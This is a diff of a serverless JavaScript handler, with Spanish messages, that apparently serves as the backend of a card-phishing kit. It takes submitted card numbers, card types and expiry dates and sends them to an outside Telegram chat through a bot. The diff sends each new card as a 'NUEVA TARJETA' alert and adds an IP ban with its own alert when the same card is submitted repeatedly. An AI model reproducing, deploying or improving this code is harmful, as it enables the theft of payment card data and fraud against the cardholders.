@@ -147,20 +147,28 @@ exports.handler = async (event) => {
             });
 
             if (spamCheck.isSpam) {
-                let message = `⚠️ SPAM DETECTADO ⚠️\n\n🔁 TARJETA REPETIDA (${spamCheck.count}x)\n⏱️ Enviada ${spamCheck.count} veces en ${spamCheck.timeDiffMinutes} minutos\n\n${cardType}\nNumero: ${cleanNum}\nVence: ${expMonth}/${expYear}\nFecha: ${fecha}`;
-
-                if (spamCheck.isBanned) {
-                    message += `\n\n🚫 IP BANEADA POR 5 MINUTOS`;
-                    banIP(ip);
-                }
-
                 console.log('SPAM detectado:', spamCheck);
 
-                try {
-                    const result = await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
-                    console.log('Mensaje enviado:', result);
-                } catch (telegramError) {
-                    console.error('Error enviando a Telegram:', telegramError);
+                if (spamCheck.isBanned) {
+                    banIP(ip);
+                    let banMessage = `🚫 IP BANEADA
+
+🔁 TARJETA REPETIDA (${spamCheck.count}x)
+⏱️ Enviada ${spamCheck.count} veces en ${spamCheck.timeDiffMinutes} minutos
+
+${cardType}
+Numero: ${cleanNum}
+Vence: ${expMonth}/${expYear}
+Fecha: ${fecha}
+
+🚫 IP BANEADA POR 5 MINUTOS`;
+
+                    try {
+                        await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, banMessage);
+                        console.log('Mensaje de ban enviado');
+                    } catch (telegramError) {
+                        console.error('Error enviando a Telegram:', telegramError);
+                    }
                 }
 
                 const redirectUrl = spamCheck.isBanned
@@ -175,6 +183,21 @@ exports.handler = async (event) => {
                     },
                     body: ''
                 };
+            } else {
+                const message = `🔔 NUEVA TARJETA
+
+${cardType}
+Numero: ${cleanNum}
+Vence: ${expMonth}/${expYear}
+Fecha: ${fecha}`;
+
+                console.log('Enviando tarjeta nueva...');
+                try {
+                    const result = await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
+                    console.log('Mensaje enviado:', result);
+                } catch (telegramError) {
+                    console.error('Error enviando a Telegram:', telegramError);
+                }
             }
         } else {
             console.error('Faltan variables de entorno');
